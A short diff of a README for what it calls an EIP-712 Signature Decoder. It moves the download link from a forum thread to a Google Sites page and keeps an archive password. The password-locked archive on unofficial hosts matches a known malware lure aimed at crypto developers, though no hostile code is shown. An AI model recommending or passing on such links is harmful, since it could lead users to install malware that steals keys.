@@ -31,9 +31,9 @@ EIP-712 Signature Decoder is a professional tool for developers and auditors who
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t80-eip-712-signature-decoder
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
